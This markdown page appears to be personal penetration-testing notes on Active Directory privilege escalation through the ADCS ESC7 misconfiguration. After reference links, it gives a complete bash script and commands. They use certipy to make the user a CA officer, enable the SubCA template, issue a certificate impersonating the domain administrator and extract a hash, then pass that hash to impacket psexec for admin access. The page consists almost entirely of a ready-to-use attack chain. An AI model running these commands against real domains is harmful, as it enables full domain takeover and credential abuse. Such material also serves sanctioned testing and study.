---
title: Active Directory
---

# Active Directory Privilege Escalation

- [Hacktricks CS Domain Escalation](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#attack-2)
- [Hacktricks Certificates](https://book.hacktricks.xyz/crypto-and-stego/certificates)
- [impacket](https://github.com/fortra/impacket)
- [certipy](https://github.com/ly4k/Certipy)

## Vulnerable Certificate Authority Access Control - ESC7
- [Hacktricks ESC7](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#vulnerable-certificate-authority-access-control-esc7)
```bash
#!/bin/bash

theca='xxxx-DC01-CA'
theuser='xxx@xxx.com'
theusername='xxxxx'
theadmin='administrator@xxx.com'
thepassword='xxxxxxxxx'
theip='x.x.x.x' 
thetarget='xxx.com'

certipy-ad ca -ca $theca -add-officer $theusername -username $theuser -password $thepassword -dc-ip $theip
certipy-ad ca -ca $theca -enable-template SubCA -username $theuser -password $thepassword -dc-ip $theip

REQUEST_ID=$(echo "y" | certipy-ad req -username $theuser -password $thepassword -ca $theca -target $thetarget -template SubCA -upn $theadmin -dc-ip $theip | awk -F' ' '/Request ID is/ {print $5}')
echo "Request ID: $REQUEST_ID"

certipy-ad ca -ca $theca -issue-request $REQUEST_ID -username $theuser -password $thepassword -dc-ip $theip
certipy-ad req -username $theuser -password $thepassword -ca $theca -target $thetarget -retrieve $REQUEST_ID -dc-ip $theip

certipy-ad auth -pfx 'administrator.pfx' -username 'administrator' -domain $thetarget -dc-ip $theip
```

```bash
# this returns a hash
certipy-ad auth -pfx 'administrator.pfx' -username 'administrator' -domain $thetargetdomain -dc-ip $theip

# use the hash here
python psexec.py -hashes hhhhhhhh:hhhhhhhhh administrator@xxxx.com
```

